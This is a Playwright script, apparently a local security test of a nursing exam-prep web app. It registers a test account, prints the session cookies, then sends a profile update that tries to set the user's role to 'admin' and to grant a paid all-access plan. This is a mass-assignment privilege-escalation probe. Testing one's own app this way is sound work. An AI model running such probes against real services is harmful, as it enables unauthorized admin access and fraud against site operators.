import { chromium } from "playwright";

async function run() {
  const browser = await chromium.launch({ channel: "chrome", headless: true });
  const page = await browser.newPage();
  
  const nonce = Date.now();
  await page.goto("http://127.0.0.1:3000/sign-up?from=/dashboard");
  await page.fill("#fullName", `Student ${nonce}`);
  await page.fill("#email", `cand_${nonce}@test.com`);
  await page.fill("#password", `SecurePass-2026!#Nurse_${nonce}`);

  const termsCheckbox = page.locator('input[name="agreeTerms"], input[type="checkbox"]').first();
  await termsCheckbox.check({ force: true });
  await page.click('button[type="submit"]');

  await page.waitForURL(/\/(dashboard|courses|profile)/, { timeout: 15000 });
  console.log("Logged in at:", page.url());

  const cookies = await page.context().cookies();
  console.log("Cookies after signup:", cookies.map(c => ({ name: c.name, value: c.value.substring(0, 20) })));

  const putResult = await page.evaluate(async () => {
    const resp = await fetch("/api/profile", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        displayName: "Hacked Candidate",
        role: "admin",
        activePlan: "NCLEX-RN & PN All-Access",
      }),
    });
    const text = await resp.text();
    return { status: resp.status, text };
  });

  console.log("PUT /api/profile result:", putResult);
  await browser.close();
}

run().catch(console.error);
